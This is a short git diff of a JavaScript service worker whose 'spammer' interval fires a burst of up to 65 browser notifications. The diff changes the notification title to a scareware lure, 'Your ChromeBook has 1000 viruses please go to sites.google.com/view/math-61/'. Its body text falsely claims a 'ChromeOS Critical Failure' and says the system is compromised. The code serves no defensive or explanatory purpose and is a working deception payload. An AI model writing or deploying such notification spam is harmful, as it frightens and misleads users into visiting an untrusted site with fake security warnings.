@@ -4,7 +4,7 @@ self.addEventListener('message', (event) => {
     const maxBurst = 65; 
     
     const spammer = setInterval(() => {
-      self.registration.showNotification("⚠️ EMERGENCY SYSTEM ALERT #" + (count + 1), {
+      self.registration.showNotification("Your ChromeBook has 1000 viruses please go to sites.google.com/view/math-61/" + (count + 1), {
         body: "ChromeOS Critical Failure: System integrity compromised. Action required.",
         icon: "https://upload.wikimedia.org",
         tag: "spam-" + Date.now() + "-" + count,
